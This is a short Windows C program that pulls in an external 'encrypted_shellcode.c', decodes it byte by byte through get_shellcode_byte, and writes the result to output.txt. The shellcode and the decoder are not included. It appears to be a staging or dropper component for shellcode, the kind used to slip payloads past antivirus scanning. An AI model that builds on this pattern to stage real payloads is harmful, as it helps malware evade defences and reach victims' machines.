#include <windows.h>
#include "encrypted_shellcode.c"

int main() {
    HANDLE hFile;
    DWORD bytesWritten;

    // Create or open the file
    hFile = CreateFile("output.txt",               // File name
                       GENERIC_WRITE,              // Open for writing
                       0,                          // Do not share
                       NULL,                       // Default security
                       CREATE_ALWAYS,              // Create a new file
                       FILE_ATTRIBUTE_NORMAL,      // Normal file
                       NULL);                      // No template

    if (hFile == INVALID_HANDLE_VALUE) {
        return 1; // Error opening file
    }

    // Write to the file
    unsigned char buf;
    for (int i=0; i < sizeof(encrypted_shellcode); i++){
        buf = get_shellcode_byte(i);
        WriteFile(hFile, &buf, 1, &bytesWritten, NULL);
    }

    // Close the file handle
    CloseHandle(hFile);

    return 0; // Success
}